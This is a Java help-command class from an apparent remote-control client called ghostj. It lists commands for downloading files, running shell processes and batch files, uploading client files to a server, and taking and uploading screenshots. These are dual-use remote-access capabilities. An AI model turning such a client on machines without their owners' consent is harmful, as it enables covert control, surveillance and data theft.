package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;

/**
 * 客户端的帮助信息
 * @author Rock Chin
 */
public class FuncHelp implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!help";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 0;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        String helpinfo = "client的help\n" +
                "!!gget <url> <savePath> <fileName>  从url下载文件\n" +
                "!!reconn  使客户端重启建立连接\n" +
                "!!help  显示此消息\n" +
                "!!name <newName>  修改客户端name\n" +
                "!!kill  kill当前客户端正在进行的process\n" +
                "\t（仅断开与process的连接，无法终止进程）\n" +
                "\n" +
                "!!listcfg  列出客户端的config所有字段\n" +
                "!!rmcfg <fieldKey>  删除客户端的config中指定字段\n" +
                "!!cfg <key> <value>  修改/增加客户端config中指定字段的值\n" +
                "!!writecfg  将客户端的config写入文件\n" +
                "\n" +
                "!!proc <oper> [param]  多任务控制系列指令\n" +
                "      oper列表:\n" +
                "      new <name> [初始指令]   新建名为name的任务，并指定初始指令\n" +
                "                             若未指定初始指令将自动以cmd启动新任务\n" +
                "      ls   列出所有此客户端的任务\n" +
                "      focus <name(wordStartWith)>  聚焦到name以参数开头的任务\n" +
                "      disc <fullName>  断连name为参数的任务\n" +
                "                       !!警告:这个命令不会杀死任务中启动的进程,并且会使client与此进程失去连接\n" +
                "   *process:未聚集时直接输入的指令将自动创建一个临时process\n" +
                "\n" +
                "!!bat <oper> [param]  客户端侧批处理文件系列指令\n" +
                "      oper列表:\n" +
                "      reset        清空现有批处理文件内容\n" +
                "      view         查看批处理文件内容\n" +
                "      add <命令...> 添加一行批处理命令\n" +
                "      run          执行批处理文件\n" +
                "   *客户端侧批处理文件:只有一个批处理文件被客户端操作\n" +
                "\n" +
                "!!rft <oper> [params..]  文件传输指令\n" +
                "      oper列表:\n" +
                "      upload <filePathOnClient> <savePathOnServer>  上传一个文件\n" +
                "\n" +
                "!!scr [picFile.png]  把屏幕截图保存到文件(png格式)并上传至server\n";
        HandleConn.writeToServer(helpinfo);
        HandleConn.sendFinishToServer();
    }
}
